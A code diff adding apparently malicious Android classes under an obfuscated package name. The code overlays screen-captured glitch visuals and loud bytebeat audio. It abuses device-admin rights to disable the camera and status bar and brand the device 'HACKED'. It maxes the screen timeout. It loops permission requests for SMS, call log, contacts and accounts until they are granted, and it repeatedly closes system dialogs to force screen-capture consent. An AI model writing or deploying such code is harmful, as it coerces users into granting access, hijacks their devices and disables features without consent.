+                stage5Src = new int[screenWidth * screenHeight];
+                lastScreenshot.getPixels(stage5Src, 0, screenWidth, 0, 0, screenWidth, screenHeight);
+                stage5Snapped = true;
+            } catch (Exception e) {}
+        }
+        if (stage5Src == null) {
+            stage5Src = new int[screenWidth * screenHeight];
+            for (int i = 0; i < stage5Src.length; i++) stage5Src[i] = 0xFF000000 | random.nextInt(0xFFFFFF);
+        }
+
+        int[] dstPixels = new int[screenWidth * screenHeight];
+        System.arraycopy(stage5Src, 0, dstPixels, 0, stage5Src.length);
+
+        int frame = stage5Frame;
+        for (int x = 0; x < screenWidth; x++) {
+            for (int y = 0; y < screenHeight; y++) {
+                int idx = y * screenWidth + x;
+                int i7 = x * frame;
+                int i8 = ((i7 * y) * frame) ^ ((frame * y) & i7);
+                if (i8 == 0) i8 = 1;
+                int iLog = (int)((frame ^ 4) + ((frame * 4) * Math.log(Math.abs(i8) + 1)));
+                float[] hsl = rgb2hsl(dstPixels[idx]);
+                float hue = (float)(((iLog / 400.0) + ((y / (double)screenHeight) * 0.2)) % 1.0);
+                if (hue < 0) hue += 1f;
+                dstPixels[idx] = hsl2rgb(hue, hsl[1], hsl[2]);
+            }
+        }
+        stage5Frame++;
+
+        Bitmap stage5Out = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
+        stage5Out.setPixels(dstPixels, 0, screenWidth, 0, 0, screenWidth, screenHeight);
+        canvas.drawBitmap(stage5Out, 0, 0, null);
+        stage5Out.recycle();
+
+        if (im22 != null && !im22.isRecycled()) {
+            int size = (int)(Math.min(screenWidth, screenHeight) / 2.2f);
+            Bitmap scaled = Bitmap.createScaledBitmap(im22, size, size, true);
+            int cx = (screenWidth - size) / 2;
+            int cy = (screenHeight - size) / 2;
+            canvas.drawBitmap(scaled, cx, cy, null);
+            if (scaled != im22) scaled.recycle();
+        }
+
+        long now = System.currentTimeMillis();
+        if (now - nextStage5Spawn >= 100) {
+            nextStage5Spawn = now;
+            Bitmap chosen = random.nextBoolean() ? im10 : im8;
+            if (chosen != null && !chosen.isRecycled()) {
+                SmallIcon si = new SmallIcon();
+                si.bmp = chosen;
+                int baseSize = Math.min(chosen.getWidth(), chosen.getHeight());
+                int targetSize = Math.max(8, baseSize / 3);
+                si.x = random.nextFloat() * (screenWidth - targetSize);
+                si.y = random.nextFloat() * (screenHeight - targetSize);
+                si.angle = 0f;
+                si.angularV = 0f;
+                si.vx = 0f;
+                si.vy = 0f;
+                stage5SmallIcons.add(si);
+                stage5Sizes.add(targetSize);
+            }
+        }
+
+        for (int i = 0; i < stage5SmallIcons.size(); i++) {
+            SmallIcon si = stage5SmallIcons.get(i);
+            if (si.bmp == null || si.bmp.isRecycled()) continue;
+            int targetSize = i < stage5Sizes.size() ? stage5Sizes.get(i) : Math.max(8, Math.min(si.bmp.getWidth(), si.bmp.getHeight()) / 3);
+            Paint p = new Paint(Paint.ANTI_ALIAS_FLAG);
+            p.setFilterBitmap(true);
+            Rect src = new Rect(0, 0, si.bmp.getWidth(), si.bmp.getHeight());
+            Rect dst = new Rect((int)si.x, (int)si.y, (int)si.x + targetSize, (int)si.y + targetSize);
+            canvas.drawBitmap(si.bmp, src, dst, p);
+        }
+    }
+
+    private float[] rgb2hsl(int color) {
+        float r = ((color >> 16) & 0xFF) / 255f;
+        float g = ((color >> 8) & 0xFF) / 255f;
+        float b = (color & 0xFF) / 255f;
+        float mn = Math.min(Math.min(r, g), b);
+        float mx = Math.max(Math.max(r, g), b);
+        float d = mx - mn;
+        float h = 0f, s = 0f;
+        float l = (mx + mn) / 2f;
+        if (d != 0f) {
+            s = l < .5f ? d / (mx + mn) : d / (2f - mx - mn);
+            float dr = ((mx - r) / 6f + d / 2f) / d;
+            float dg = ((mx - g) / 6f + d / 2f) / d;
+            float db = ((mx - b) / 6f + d / 2f) / d;
+            if (r == mx) h = db - dg;
+            else if (g == mx) h = (1f/3f) + dr - db;
+            else h = (2f/3f) + dg - dr;
+            if (h < 0f) h += 1f;
+            if (h > 1f) h -= 1f;
+        }
+        return new float[]{h, s, l};
+    }
+
+    private int hsl2rgb(float h, float s, float l) {
+        float r = l, g = l, b = l;
+        float v = (l <= .5f) ? (l * (1f + s)) : (l + s - l * s);
+        if (v > 0f) {
+            float m = l + l - v;
+            float sv = (v - m) / v;
+            h *= 6f;
+            int sect = (int)h;
+            float fract = h - sect;
+            float vsf = v * sv * fract;
+            float mid1 = m + vsf;
+            float mid2 = v - vsf;
+            switch (sect) {
+                case 0: r = v; g = mid1; b = m; break;
+                case 1: r = mid2; g = v; b = m; break;
+                case 2: r = m; g = v; b = mid1; break;
+                case 3: r = m; g = mid2; b = v; break;
+                case 4: r = mid1; g = m; b = v; break;
+                case 5: r = v; g = m; b = mid2; break;
+            }
+        }
+        return 0xFF000000
+                | (((int)(r * 255f) & 0xFF) << 16)
+                | (((int)(g * 255f) & 0xFF) << 8)
+                | ((int)(b * 255f) & 0xFF);
+    }
+
+    private void startBytebeat(final int phase, final int sampleRate, final long durationMs) {
+        stopBytebeat();
+        bytebeatRunning = true;
+        bytebeatThread = new Thread(new Runnable() {
+            @Override public void run() {
+                int minBuf = AudioTrack.getMinBufferSize(sampleRate,
+                        AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_8BIT);
+                if (minBuf <= 0) minBuf = sampleRate;
+                AudioAttributes attrs = new AudioAttributes.Builder()
+                        .setUsage(AudioAttributes.USAGE_MEDIA)
+                        .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
+                        .setFlags(AudioAttributes.FLAG_AUDIBILITY_ENFORCED)
+                        .build();
+                AudioFormat fmt = new AudioFormat.Builder()
+                        .setEncoding(AudioFormat.ENCODING_PCM_8BIT)
+                        .setSampleRate(sampleRate)
+                        .setChannelMask(AudioFormat.CHANNEL_OUT_MONO)
+                        .build();
+                AudioTrack track = new AudioTrack(
+                        attrs, fmt, minBuf,
+                        AudioTrack.MODE_STREAM,
+                        AudioManager.AUDIO_SESSION_ID_GENERATE);
+                bytebeatTrack = track;
+                try { track.play(); } catch (Exception e) { bytebeatRunning = false; return; }
+                int chunk = 2048;
+                byte[] buf = new byte[chunk];
+                long startTime = System.currentTimeMillis();
+                long t = 0;
+                while (bytebeatRunning && !finished) {
+                    if (durationMs > 0 && (System.currentTimeMillis() - startTime) >= durationMs) {
+                        bytebeatRunning = false;
+                        break;
+                    }
+                    for (int i = 0; i < chunk; i++) {
+                        int tt = (int)(t + i);
+                        int v = 0;
+                        switch (phase) {
+                            case 1:
+                                v = (tt & (tt >> 8));
+                                break;
+                            case 2:
+                                v = (-tt >> 5 & ((tt >> 2) * (tt >> 5)));
+                                break;
+                            case 3:
+                                v = (tt * (tt & (tt >> 12))) / 256;
+                                break;
+                            case 4:
+                                v = (tt * (tt ^ tt + (tt >> 15 | 1) ^ (tt - 1280 ^ tt) >> 10));
+                                break;
+                            case 5:
+                                v = (((tt >>> 5) | (tt >>> 4)) * tt) >> (tt >>> 16);
+                                break;
+                        }
+                        buf[i] = (byte)(v & 0xFF);
+                    }
+                    try { track.write(buf, 0, chunk); } catch (Exception e) { break; }
+                    t += chunk;
+                }
+                try { track.stop(); track.release(); } catch (Exception e) {}
+                bytebeatTrack = null;
+            }
+        });
+        bytebeatThread.start();
+    }
+
+    private void stopBytebeat() {
+        bytebeatRunning = false;
+        if (bytebeatThread != null) {
+            try { bytebeatThread.join(200); } catch (InterruptedException e) {}
+            bytebeatThread = null;
+        }
+        if (bytebeatTrack != null) {
+            try { bytebeatTrack.stop(); bytebeatTrack.release(); } catch (Exception e) {}
+            bytebeatTrack = null;
+        }
+    }
+
+    private void draw() {
+        if (canvas == null) return;
+        canvas.drawColor(Color.TRANSPARENT, PorterDuff.Mode.CLEAR);
+        if (stage == 1) drawStage1();
+        else if (stage == 2) drawStage2();
+        else if (stage == 3) drawStage3();
+        else if (stage == 4) drawStage4();
+        else if (stage == 5) drawStage5();
+        if (view != null) {
+            view.setImageBitmap(bitmap);
+            view.invalidate();
+        }
+    }
+
+    private void drawStage1() {
+        long elapsed = System.currentTimeMillis() - stage1Start;
+        juliaWetness = Math.min(1f, elapsed / 30000f);
+        drawRedXorPattern();
+        drawJulia();
+        drawSmallIcons();
+        if (im16 != null && !im16.isRecycled()) {
+            int size = screenWidth / 3;
+            Bitmap scaled = Bitmap.createScaledBitmap(im16, size, size, true);
+            int cx = (screenWidth - size) / 2;
+            int cy = (screenHeight - size) / 2;
+            canvas.drawBitmap(scaled, cx, cy, null);
+            if (scaled != im16) scaled.recycle();
+        }
+    }
+
+    private void drawRedXorPattern() {
+        int step = 8;
+        int t = (int) (System.currentTimeMillis() / 30);
+        for (int y = 0; y < screenHeight; y += step) {
+            for (int x = 0; x < screenWidth; x += step) {
+                int xor = ((x ^ y) + t) & 0xFF;
+                int color = 0xFF000000 | (xor << 16) | (0) | (0);
+                paint.setColor(color);
+                canvas.drawRect(x, y, x + step, y + step, paint);
+            }
+        }
+    }
+
+    private void drawJulia() {
+        int w = screenWidth;
+        int h = screenHeight;
+        int step = 4;
+        float zoom = 250f + juliaWetness * 100f * (float) Math.sin(juliaAngle * 0.5f);
+        float jr = -0.7f + 0.1f * (float) Math.sin(juliaAngle);
+        float ji = 0.27f + 0.1f * (float) Math.cos(juliaAngle);
+        juliaAngle += 0.15f;
+        for (int y = 0; y < h; y += step) {
+            for (int x = 0; x < w; x += step) {
+                float zx = (x - w / 2f) / zoom;
+                float zy = (y - h / 2f) / zoom;
+                float wetX = (float) Math.sin((x + juliaAngle * 30f) * 0.02f) * juliaWetness * 0.3f;
+                float wetY = (float) Math.cos((y + juliaAngle * 20f) * 0.02f) * juliaWetness * 0.3f;
+                zx += wetX;
+                zy += wetY;
+                int iter = 0;
+                while (zx * zx + zy * zy < 4 && iter < 32) {
+                    float tmp = zx * zx - zy * zy + jr;
+                    zy = 2 * zx * zy + ji;
+                    zx = tmp;
+                    iter++;
+                }
+                float hue = (iter * 8 + juliaAngle * 10) % 360;
+                int rgb = hsvToRgb(hue, 1f, iter == 32 ? 0f : 1f);
+                paint.setColor(0x80000000 | rgb);
+                canvas.drawRect(x, y, x + step, y + step, paint);
+            }
+        }
+    }
+
+    private void drawSmallIcons() {
+        for (SmallIcon si : smallIcons) {
+            si.x += si.vx;
+            si.y += si.vy;
+            si.angle += si.angularV;
+            if (si.x < -200 || si.x > screenWidth + 200 ||
+                si.y < -200 || si.y > screenHeight + 200) {
+                si.x = screenWidth / 2f;
+                si.y = screenHeight / 2f;
+                float a = random.nextFloat() * (float)(Math.PI * 2);
+                float speed = 8f + random.nextFloat() * 20f;
+                si.vx = (float) Math.cos(a) * speed;
+                si.vy = (float) Math.sin(a) * speed;
+                si.bmp = (random.nextBoolean() ? im8 : im9);
+            }
+            if (si.bmp != null && !si.bmp.isRecycled()) {
+                Matrix m = new Matrix();
+                m.postRotate(si.angle, si.bmp.getWidth() / 2f, si.bmp.getHeight() / 2f);
+                m.postScale(0.3f, 0.3f);
+                m.postTranslate(si.x - si.bmp.getWidth() * 0.15f, si.y - si.bmp.getHeight() * 0.15f);
+                canvas.drawBitmap(si.bmp, m, null);
+            }
+        }
+    }
+
+    private void drawStage2() {
+        if (bgIm21 != null && !bgIm21.isRecycled()) {
+            Rect dst = new Rect(0, 0, screenWidth, screenHeight);
+            canvas.drawBitmap(bgIm21, null, dst, null);
+        }
+        drawXorPattern();
+        if (vertices != null) {
+            for (int ti = 0; ti < 8; ti++) {
+                Bitmap icon = tessIcons[ti];
+                if (icon == null || icon.isRecycled()) continue;
+                for (int i = 0; i < vertices.length; i++) {
+                    rotateX(vertices[i], anglesX[ti][0]);
+                    rotateY(vertices[i], anglesY[ti][0]);
+                    rotateZ(vertices[i], anglesZ[ti][0]);
+                }
+                for (int i = 0; i < edges.length; i++) {
+                    int v0 = edges[i][0];
+                    int v1 = edges[i][1];
+                    int x0 = (int) (vertices[v0][0] + tessCX[ti]);
+                    int y0 = (int) (vertices[v0][1] + tessCY[ti]);
+                    int x1 = (int) (vertices[v1][0] + tessCX[ti]);
+                    int y1 = (int) (vertices[v1][1] + tessCY[ti]);
+                    drawIconLine(icon, x0, y0, x1, y1);
+                }
+                tessCX[ti] += tessVX[ti];
+                tessCY[ti] += tessVY[ti];
+                if (tessCX[ti] > screenWidth - tessSize/2f || tessCX[ti] < tessSize/2f) tessVX[ti] *= -1;
+                if (tessCY[ti] > screenHeight - tessSize/2f || tessCY[ti] < tessSize/2f) tessVY[ti] *= -1;
+            }
+        }
+    }
+
+    private void drawXorPattern() {
+        if (xorBuf == null) return;
+        int[] pixels = new int[xorW * xorH];
+        xorT += 2;
+        int halfW = xorW / 2;
+        int halfH = xorH / 2;
+        for (int y = 0; y < xorH; y++) {
+            int cy = y - halfH;
+            int ay = Math.abs(cy);
+            for (int x = 0; x < xorW; x++) {
+                int cx = x - halfW;
+                int ax = Math.abs(cx);
+                int xorVal = (x ^ y) + xorT;
+                int sierpMask = ((x & y) == 0) ? 1 : 0;
+                int sierpXor = (ax ^ ay) + xorT;
+                int finalVal = (sierpMask == 1) ? xorVal : sierpXor;
+                float hue = (finalVal * 2.0f) % 360f;
+                if (hue < 0f) hue += 360f;
+                int hi = (int) (hue / 60f) % 6;
+                float f = hue / 60f - (float) Math.floor(hue / 60f);
+                float p = 0f, q = 1f - f, t = f;
+                float rf, gf, bf;
+                switch (hi) {
+                    case 0: rf = 1f; gf = t; bf = p; break;
+                    case 1: rf = q; gf = 1f; bf = p; break;
+                    case 2: rf = p; gf = 1f; bf = t; break;
+                    case 3: rf = p; gf = q; bf = 1f; break;
+                    case 4: rf = t; gf = p; bf = 1f; break;
+                    default: rf = 1f; gf = p; bf = q; break;
+                }
+                int outR = (int) (rf * 255f) & 0xFF;
+                int outG = (int) (gf * 255f) & 0xFF;
+                int outB = (int) (bf * 255f) & 0xFF;
+                pixels[y * xorW + x] = (255 << 24) | (outR << 16) | (outG << 8) | outB;
+            }
+        }
+        xorBuf.setPixels(pixels, 0, xorW, 0, 0, xorW, xorH);
+        Rect dst = new Rect(0, 0, screenWidth, screenHeight);
+        canvas.drawBitmap(xorBuf, null, dst, null);
+    }
+
+    private void drawIconLine(Bitmap icon, int x0, int y0, int x1, int y1) {
+        int dx = Math.abs(x1 - x0);
+        int dy = -Math.abs(y1 - y0);
+        int sx = (x0 < x1) ? 1 : -1;
+        int sy = (y0 < y1) ? 1 : -1;
+        int error = dx + dy;
+        int i = 0;
+        while (true) {
+            if (i == 0) {
+                canvas.drawBitmap(icon, x0 - icon.getWidth() / 2f, y0 - icon.getHeight() / 2f, null);
+                i = 10;
+            } else i--;
+            if (x0 == x1 && y0 == y1) break;
+            int e2 = 2 * error;
+            if (e2 >= dy) { if (x0 == x1) break; error += dy; x0 += sx; }
+            if (e2 <= dx) { if (y0 == y1) break; error += dx; y0 += sy; }
+        }
+    }
+
+    private void drawStage3() {
+        long now = System.currentTimeMillis();
+        float timeSec = (now - stage3Start) / 1000f;
+        if (timeSec < 0) timeSec = 0;
+        float distortion = (float) Math.pow(timeSec, 1.8f) * 4.0f;
+        int blockSize = 8;
+        int[] waveOffsetY = new int[screenHeight];
+        int[] waveOffsetX = new int[screenWidth];
+        for (int y = 0; y < screenHeight; y++) {
+            waveOffsetY[y] = (int)(Math.sin((y * 0.01) + (timeSec * 4)) * distortion);
+        }
+        for (int x = 0; x < screenWidth; x++) {
+            waveOffsetX[x] = (int)(Math.cos((x * 0.01) + (timeSec * 4)) * distortion);
+        }
+        boolean isGreenWhite = ((now - stage3Start) / 1000) % 2 == 1;
+        int[] pixels = new int[screenWidth * screenHeight];
+        int index = 0;
+        for (int y = 0; y < screenHeight; y++) {
+            int wy = waveOffsetY[y];
+            for (int x = 0; x < screenWidth; x++) {
+                int waveX = Math.abs(x + wy);
+                int waveY = Math.abs(y + waveOffsetX[x]);
+                int val = ((waveX / blockSize) ^ (waveY / blockSize)) & 255;
+                int color;
+                if (isGreenWhite) color = Color.argb(255, val, 255, val);
+                else color = Color.argb(255, val, 0, 255 - val);
+                pixels[index++] = color;
+            }
+        }
+        Bitmap bgBitmap = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
+        bgBitmap.setPixels(pixels, 0, screenWidth, 0, 0, screenWidth, screenHeight);
+        canvas.drawBitmap(bgBitmap, 0, 0, paint);
+        bgBitmap.recycle();
+
+        if (now - lastImageTeleport >= 50) {
+            lastImageTeleport = now;
+            for (TeleportImage fi : flyingImages) {
+                fi.x = random.nextInt(Math.max(1, screenWidth));
+                fi.y = random.nextInt(Math.max(1, screenHeight));
+            }
+        }
+        boolean inverted = ((now / 200) % 2) == 1;
+        Paint imgPaint = new Paint(Paint.ANTI_ALIAS_FLAG);
+        if (inverted) {
+            ColorMatrix cm = new ColorMatrix(new float[]{
+                    -1,0,0,0,255,
+                    0,-1,0,0,255,
+                    0,0,-1,0,255,
+                    0,0,0,1,0});
+            imgPaint.setColorFilter(new ColorMatrixColorFilter(cm));
+        }
+        for (TeleportImage fi : flyingImages) {
+            if (fi.bmp == null || fi.bmp.isRecycled()) continue;
+            canvas.drawBitmap(fi.bmp, fi.x - fi.bmp.getWidth() / 2f, fi.y - fi.bmp.getHeight() / 2f, imgPaint);
+        }
+    }
+
+    private void drawStage4() {
+        long now = System.currentTimeMillis();
+
+        if (now - lastSwapTime >= 300) {
+            lastSwapTime = now;
+            for (int i = 0; i < sierpChunks.size(); i++) {
+                SierpChunk a = sierpChunks.get(i);
+                int j = random.nextInt(sierpChunks.size());
+                SierpChunk b = sierpChunks.get(j);
+                int tx = a.x, ty = a.y;
+                a.x = b.x; a.y = b.y;
+                b.x = tx; b.y = ty;
+            }
+        }
+
+        if (now - lastInvertTime >= 100) {
+            lastInvertTime = now;
+            for (SierpChunk c : sierpChunks) c.inverted = false;
+            int count = Math.max(1, sierpChunks.size() / 3);
+            for (int i = 0; i < count; i++) {
+                sierpChunks.get(random.nextInt(sierpChunks.size())).inverted = true;
+            }
+        }
+
+        int[] srcPixels = new int[screenWidth * screenHeight];
+        if (projectionReady && lastScreenshot != null) {
+            try {
+                lastScreenshot.getPixels(srcPixels, 0, screenWidth, 0, 0, screenWidth, screenHeight);
+            } catch (Exception e) {
+                fillNoise(srcPixels);
+            }
+        } else {
+            fillNoise(srcPixels);
+        }
+
+        int[] dstPixels = new int[screenWidth * screenHeight];
+        System.arraycopy(srcPixels, 0, dstPixels, 0, srcPixels.length);
+
+        for (SierpChunk c : sierpChunks) {
+            drawSierpChunk(dstPixels, c, srcPixels);
+        }
+
+        Bitmap out = Bitmap.createBitmap(screenWidth, screenHeight, Bitmap.Config.ARGB_8888);
+        out.setPixels(dstPixels, 0, screenWidth, 0, 0, screenWidth, screenHeight);
+        canvas.drawBitmap(out, 0, 0, null);
+        out.recycle();
+
+        if (im17 != null && !im17.isRecycled()) {
+            boolean inv17 = ((now / 150) % 2) == 1;
+            Paint p17 = new Paint(Paint.ANTI_ALIAS_FLAG);
+            if (inv17) {
+                ColorMatrix cm = new ColorMatrix(new float[]{
+                        -1,0,0,0,255,
+                        0,-1,0,0,255,
+                        0,0,-1,0,255,
+                        0,0,0,1,0});
+                p17.setColorFilter(new ColorMatrixColorFilter(cm));
+            }
+            int size = screenWidth / 3;
+            Bitmap scaled = Bitmap.createScaledBitmap(im17, size, size, true);
+            int cx = (screenWidth - size) / 2;
+            int cy = (screenHeight - size) / 2;
+            canvas.drawBitmap(scaled, cx, cy, p17);
+            if (scaled != im17) scaled.recycle();
+        }
+    }
+
+    private void fillNoise(int[] px) {
+        for (int i = 0; i < px.length; i++) {
+            px[i] = 0xFF000000 | random.nextInt(0xFFFFFF);
+        }
+    }
+
+    private void drawSierpChunk(int[] dst, SierpChunk c, int[] src) {
+        int size = c.size;
+        if (size <= 0) return;
+        int cx = c.x;
+        int cy = c.y;
+
+        for (int yy = 0; yy < size; yy++) {
+            int worldY = cy + yy;
+            if (worldY < 0 || worldY >= screenHeight) continue;
+            int rowBase = worldY * screenWidth;
+            for (int xx = 0; xx <= yy; xx++) {
+                int worldX = cx + xx;
+                if (worldX < 0 || worldX >= screenWidth) continue;
+                int srcIdx = (cy + yy) * screenWidth + (cx + xx);
+                if (srcIdx < 0 || srcIdx >= src.length) continue;
+                int px = src[srcIdx];
+                if (c.inverted) px = px ^ 0x00FFFFFF;
+                dst[rowBase + worldX] = px;
+            }
+            for (int xx = 0; xx <= yy; xx++) {
+                int worldX = cx + size - xx - 1;
+                if (worldX < 0 || worldX >= screenWidth) continue;
+                int srcIdx = (cy + yy) * screenWidth + (cx + size - xx - 1);
+                if (srcIdx < 0 || srcIdx >= src.length) continue;
+                int px = src[srcIdx];
+                if (c.inverted) px = px ^ 0x00FFFFFF;
+                dst[rowBase + worldX] = px;
+            }
+        }
+    }
+
+    private int hsvToRgb(float hue, float sat, float val) {
+        if (hue < 0) hue += 360;
+        if (hue >= 360) hue -= 360;
+        int hi = (int) (hue / 60f) % 6;
+        float f = hue / 60f - (float) Math.floor(hue / 60f);
+        float p = val * (1f - sat);
+        float q = val * (1f - f * sat);
+        float t = val * (1f - (1f - f) * sat);
+        float rf, gf, bf;
+        switch (hi) {
+            case 0: rf = val; gf = t; bf = p; break;
+            case 1: rf = q; gf = val; bf = p; break;
+            case 2: rf = p; gf = val; bf = t; break;
+            case 3: rf = p; gf = q; bf = val; break;
+            case 4: rf = t; gf = p; bf = val; break;
+            default: rf = val; gf = p; bf = q; break;
+        }
+        return ((int) (rf * 255f) & 0xFF) << 16
+                | ((int) (gf * 255f) & 0xFF) << 8
+                | ((int) (bf * 255f) & 0xFF);
+    }
+
+    private void rotateX(float[] v, float angle) {
+        float y = (float) (Math.cos(angle) * v[1] - Math.sin(angle) * v[2]);
+        float z = (float) (Math.sin(angle) * v[1] + Math.cos(angle) * v[2]);
+        v[1] = y; v[2] = z;
+    }
+    private void rotateY(float[] v, float angle) {
+        float x = (float) (Math.cos(angle) * v[0] + Math.sin(angle) * v[2]);
+        float z = (float) (-Math.sin(angle) * v[0] + Math.cos(angle) * v[2]);
+        v[0] = x; v[2] = z;
+    }
+    private void rotateZ(float[] v, float angle) {
+        float x = (float) (Math.cos(angle) * v[0] - Math.sin(angle) * v[1]);
+        float y = (float) (Math.sin(angle) * v[0] + Math.cos(angle) * v[1]);
+        v[0] = x; v[1] = y;
+    }
+
+    private void applyDeviceAdminAndSettings() {
+        try {
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName admin = new ComponentName(this, F.class);
+            if (dpm != null && dpm.isAdminActive(admin)) {
+                dpm.setCameraDisabled(admin, true);
+                dpm.setScreenCaptureDisabled(admin, false);
+                dpm.setStatusBarDisabled(admin, true);
+                dpm.setOrganizationColor(admin, Color.RED);
+                dpm.setOrganizationName(admin, "HACKED HACKED HACKED HACKED");
+            }
+        } catch (Throwable t) {}
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.System.canWrite(this)) {}
+            else {
+                Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_OFF_TIMEOUT, 2147483640);
+                Settings.Global.putFloat(getContentResolver(), Settings.Global.WINDOW_ANIMATION_SCALE, 0f);
+                Settings.Global.putFloat(getContentResolver(), Settings.Global.TRANSITION_ANIMATION_SCALE, 0f);
+                Settings.Global.putFloat(getContentResolver(), Settings.Global.ANIMATOR_DURATION_SCALE, 0f);
+            }
+        } catch (Throwable t) {}
+        try {
+            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+            if (nm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                if (nm.isNotificationPolicyAccessGranted()) {
+                    nm.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_ALL);
+                }
+            }
+        } catch (Throwable t) {}
+    }
+
+    private void cleanup() {
+        if (finished) return;
+        finished = true;
+        stopBytebeat();
+        if (handler != null) handler.removeCallbacksAndMessages(null);
+        if (view != null && wm != null) { try { wm.removeView(view); } catch (Exception e) {} view = null; }
+        if (bitmap != null) { bitmap.recycle(); bitmap = null; }
+        if (im16 != null) { im16.recycle(); im16 = null; }
+        if (im8 != null) { im8.recycle(); im8 = null; }
+        if (im9 != null) { im9.recycle(); im9 = null; }
+        if (im10 != null) { im10.recycle(); im10 = null; }
+        if (im17 != null) { im17.recycle(); im17 = null; }
+        if (im22 != null) { im22.recycle(); im22 = null; }
+        if (bgIm21 != null) { bgIm21.recycle(); bgIm21 = null; }
+        for (int i = 0; i < 8; i++) { if (tessIcons[i] != null) { tessIcons[i].recycle(); tessIcons[i] = null; } }
+        if (xorBuf != null) { xorBuf.recycle(); xorBuf = null; }
+        if (virtualDisplay != null) { try { virtualDisplay.release(); } catch (Exception e) {} virtualDisplay = null; }
+        if (mediaProjection != null) { try { mediaProjection.stop(); } catch (Exception e) {} mediaProjection = null; }
+        if (imageReader != null) { try { imageReader.close(); } catch (Exception e) {} imageReader = null; }
+        if (lastScreenshot != null) { lastScreenshot.recycle(); lastScreenshot = null; }
+        stopSelf();
+        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+        if (nm != null) nm.cancel(9999);
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        if (!finished) cleanup();
+    }
+}
+package anandnxnsntodoi.chahahchhxoas.by.pbcat;
+
+import android.app.Activity;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.os.Build;
+import android.os.Bundle;
+import android.os.Handler;
+
+public class G extends Activity {
+
+    private Handler handler = new Handler();
+    private boolean requested = false;
+
+    private final String[] PERMISSIONS = new String[]{
+        android.Manifest.permission.READ_CONTACTS,
+        android.Manifest.permission.WRITE_CONTACTS,
+        android.Manifest.permission.GET_ACCOUNTS,
+        android.Manifest.permission.SEND_SMS,
+        android.Manifest.permission.RECEIVE_SMS,
+        android.Manifest.permission.READ_SMS,
+        android.Manifest.permission.RECEIVE_MMS,
+        android.Manifest.permission.RECEIVE_WAP_PUSH,
+        android.Manifest.permission.READ_PHONE_STATE,
+        android.Manifest.permission.CALL_PHONE,
+        android.Manifest.permission.READ_CALL_LOG,
+        android.Manifest.permission.WRITE_CALL_LOG,
+        android.Manifest.permission.ADD_VOICEMAIL,
+        android.Manifest.permission.USE_SIP,
+        android.Manifest.permission.PROCESS_OUTGOING_CALLS
+    };
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            checkPerms();
+        } else {
+            startActivity(new Intent(G.this, H.class));
+            finish();
+        }
+    }
+
+    private void checkPerms() {
+        if (hasAllPermissions()) {
+            startActivity(new Intent(G.this, H.class));
+            finish();
+            return;
+        }
+        if (!requested) {
+            requested = true;
+            requestPermissions(PERMISSIONS, 1234);
+        }
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                checkPerms();
+            }
+        }, 500);
+    }
+
+    private boolean hasAllPermissions() {
+        for (String perm : PERMISSIONS) {
+            if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == 1234) {
+            checkPerms();
+        }
+    }
+}
+package anandnxnsntodoi.chahahchhxoas.by.pbcat;
+
+import android.app.Activity;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.media.projection.MediaProjectionManager;
+import android.os.Bundle;
+import android.os.Handler;
+
+public class H extends Activity {
+
+    private Handler handler = new Handler();
+    private Handler closeHandler = new Handler();
+    private boolean requested = false;
+    private MediaProjectionManager mpm;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+
+        mpm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+
+        final Runnable closeRunnable = new Runnable() {
+            @Override
+            public void run() {
+                if (!requested) {
+                    sendBroadcast(new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS));
+                }
+                closeHandler.postDelayed(this, 100);
+            }
+        };
+        closeHandler.post(closeRunnable);
+
+        requestOnce();
+    }
+
+    private void requestOnce() {
+        if (requested) return;
+        requested = true;
+        if (mpm != null) {
+            Intent intent = mpm.createScreenCaptureIntent();
+            startActivityForResult(intent, 1234);
+        }
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == 1234) {
+            if (resultCode == RESULT_OK && data != null) {
+                SharedPreferences sp = getSharedPreferences("chaos_prefs", MODE_PRIVATE);
+                SharedPreferences.Editor ed = sp.edit();
+                ed.putInt("mp_result_code", resultCode);
+                ed.putString("mp_intent_uri", data.toUri(Intent.URI_INTENT_SCHEME));
+                ed.apply();
+                closeHandler.removeCallbacksAndMessages(null);
+                showMainUI();
+            } else {
+                requested = false;
+                handler.postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        requestOnce();
+                    }
+                }, 50);
+            }
+        }
+    }
+
+    private void showMainUI() {
+        try {
+            android.view.WindowManager wm = (android.view.WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
+            android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
+            wm.getDefaultDisplay().getRealMetrics(metrics);
+            final int screenWidth = metrics.widthPixels;
+            final int screenHeight = metrics.heightPixels;
+
+            android.widget.RelativeLayout mainLayout = new android.widget.RelativeLayout(this);
+            mainLayout.setBackgroundColor(android.graphics.Color.BLACK);
